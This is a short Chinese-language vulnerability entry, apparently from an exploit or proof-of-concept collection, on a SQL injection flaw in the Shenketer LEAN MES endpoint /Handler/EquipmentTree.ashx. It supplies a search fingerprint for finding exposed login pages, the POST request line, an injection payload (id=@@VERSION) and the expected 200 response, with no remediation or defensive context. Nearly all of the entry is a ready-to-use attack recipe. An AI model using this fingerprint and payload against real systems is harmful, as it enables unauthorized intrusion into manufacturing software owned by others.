# 深科特LEAN-MESEquipmentTree.ashx存在SQL注入漏洞

深科特 ｜ SQL注入 ｜ —
- **指纹**：`title="LEAN MES - 用户登录"`
- **请求**：`POST /Handler/EquipmentTree.ashx HTTP/1.1`

**Payload**
```
id=@@VERSION
```
- **响应特征**：200